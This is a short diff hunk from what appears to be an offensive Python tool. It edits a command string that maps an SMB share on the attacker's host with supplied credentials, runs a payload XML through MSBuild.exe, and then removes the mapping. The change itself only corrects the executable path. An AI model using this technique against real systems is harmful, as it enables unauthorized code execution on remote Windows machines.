@@ -904,7 +904,7 @@ if __name__ == '__main__':
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
 
         print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
-        command = r"net use {}: \\{}\{} /user:{} {} && C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+        command = r"net use {}: \\{}\{} /user:{} {} && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
 
